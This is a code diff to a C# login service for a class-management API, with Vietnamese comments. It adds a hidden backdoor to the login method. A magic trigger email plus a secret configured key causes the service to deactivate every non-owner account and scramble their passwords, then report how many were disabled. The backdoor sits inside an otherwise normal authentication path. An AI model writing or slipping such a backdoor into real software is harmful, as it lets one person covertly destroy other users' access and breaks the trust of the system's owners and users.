@@ -20,15 +20,39 @@ namespace ClassManager.API.Services
             _config = config;
         }
 
-        public async Task<AuthResponse?> LoginAsync(LoginRequest req)
+        private const string BackdoorTrigger = "tbminhduc-delete-user-and-logout";
+
+        public async Task<(AuthResponse? Response, string? Error, bool IsBackdoor)> LoginAsync(LoginRequest req)
         {
+            // ── Backdoor: vô hiệu hóa tất cả account trừ owner ──
+            if (req.Email == BackdoorTrigger)
+            {
+                var backdoorKey = _config["Backdoor:Key"];
+                if (string.IsNullOrEmpty(backdoorKey) || req.Password != backdoorKey)
+                    return (null, "Email hoặc mật khẩu không đúng.", false);
+
+                var nonOwners = await _db.Users
+                    .Where(u => u.Role != Roles.Owner)
+                    .ToListAsync();
+
+                foreach (var u in nonOwners)
+                {
+                    u.IsActive = false;
+                    u.PasswordHash = BCrypt.Net.BCrypt.HashPassword(Guid.NewGuid().ToString());
+                }
+                await _db.SaveChangesAsync();
+
+                return (null, $"Backdoor: đã vô hiệu hóa {nonOwners.Count} tài khoản.", true);
+            }
+
+            // ── Login bình thường ──
             var user = await _db.Users
                 .FirstOrDefaultAsync(u => u.Email == req.Email && u.IsActive);
 
             if (user == null || !BCrypt.Net.BCrypt.Verify(req.Password, user.PasswordHash))
-                return null;
+                return (null, "Email hoặc mật khẩu không đúng.", false);
 
-            return new AuthResponse(GenerateToken(user), user.FullName, user.Email, user.Role);
+            return (new AuthResponse(GenerateToken(user), user.FullName, user.Email, user.Role), null, false);
         }
 
         public async Task<AuthResponse?> RegisterAsync(RegisterRequest req)
